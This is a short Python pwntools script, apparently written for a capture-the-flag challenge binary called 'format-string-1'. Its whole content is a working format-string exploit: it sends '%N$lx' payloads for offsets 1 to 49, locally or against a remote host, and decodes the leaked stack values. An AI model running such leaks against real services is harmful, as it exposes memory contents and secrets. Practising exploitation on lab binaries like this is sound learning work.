from pwn import args, gdb, remote, process, p64, flat, ROP, ELF, context, log, sys


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./format-string-1"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "warn"
# context.terminal = "kitty"

for i in range(1, 50):
    try:
        io = start()
        format = f"%{i}$lx".encode()
        io.sendlineafter(b"you:\n", format)
        io.recvuntil(b"order: ")
        out = bytes.fromhex(io.recvline().decode())[::-1]
        print(f"{i} = {out}")
    except Exception as e:
        print(e)
        continue
